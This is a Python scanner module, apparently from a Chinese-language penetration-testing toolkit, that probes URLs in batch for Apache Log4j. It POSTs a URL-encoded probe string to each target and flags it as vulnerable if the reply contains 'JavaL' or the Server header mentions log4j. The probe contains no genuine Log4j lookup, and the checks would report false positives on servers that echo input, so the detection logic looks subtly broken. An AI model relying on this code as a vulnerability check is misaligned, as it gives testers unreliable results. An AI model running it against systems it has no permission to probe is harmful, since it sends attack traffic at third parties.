#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Log4j_Check_Run:
    def test_vuln(self,url):
        payload = "%65%78%70%72%65%73%73%69%6F%6E%3D%4A%61%76%61%4C%6F%67%4D%61%6E%61%67%65%72%26%6C%6F%67%4E%61%6D%65%3D%6C%6F%67%62%61%63%6B%3A%3A%4C%6F%67%4D%61%6E%61%67%65%72%2F%73%65%72%76%6C%65%74%2F%49%6E%74%72%6F%73%70%65%63%74%6F%72"
        headers = {"User-Agent": self.headers["User-Agent"], "Content-Type": "application/x-www-form-urlencoded"}
        # data = "1"
        # 发送HTTP POST请求
        try:
            response = requests.post(url, data=payload, headers=headers,proxies=self.proxy,verify=self.ssl, timeout=10)
            # 检查响应是否包含预期字符串
            if "JavaL" in response.text:
                OutPrintInfoSuc("Apache", f'目标存在Apache Log4j漏洞: {url}')
                if self.batch:
                    OutPutFile("apache_log4j_alive.txt", f'目标存在Apache Log4j: {url}')
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f'目标不存在Apache Log4j')
        except Exception:
            if not self.batch:
                OutPrintInfo("Apache",'目标请求出错')

    def get_url(self,input_url):
        try:
            req = requests.get(input_url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if 'log4j' in req.headers.get('Server', '').lower():
                OutPrintInfoSuc("Apache", f'目标存在Apache Log4j: {input_url}')
                if self.batch:
                    OutPrintInfoSuc("Apache", f'目标存在Apache Log4j: {input_url}')
                    OutPutFile("apache_log4j_alive.txt",f'目标存在Apache Log4j: {input_url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Apache", f'目标不存在Apache Log4j')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Apache",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Apache", '开始检测是否存在Apache Log4j漏洞...')
        self.get_url(url)
        self.test_vuln(url)
        if not self.batch:
            OutPrintInfo("Apache", 'Apache Log4j检测结束')


